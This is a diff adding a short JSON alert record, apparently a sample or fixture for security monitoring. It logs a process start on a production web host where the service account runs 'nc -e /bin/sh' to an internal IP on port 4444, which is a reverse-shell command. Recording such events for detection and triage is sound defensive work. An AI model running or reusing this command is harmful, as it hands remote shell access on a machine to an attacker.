@@ -1,0 +1,10 @@
+{
+  "alert_type": "process_start",
+  "timestamp": "2026-07-14T02:13:00Z",
+  "user": "svc_web",
+  "hostname": "prod-web01",
+  "raw_log": "proc_create pid=41822 ppid=1188 image=/bin/sh",
+  "details": {
+    "command": "nc -e /bin/sh 10.0.0.5 4444"
+  }
+}
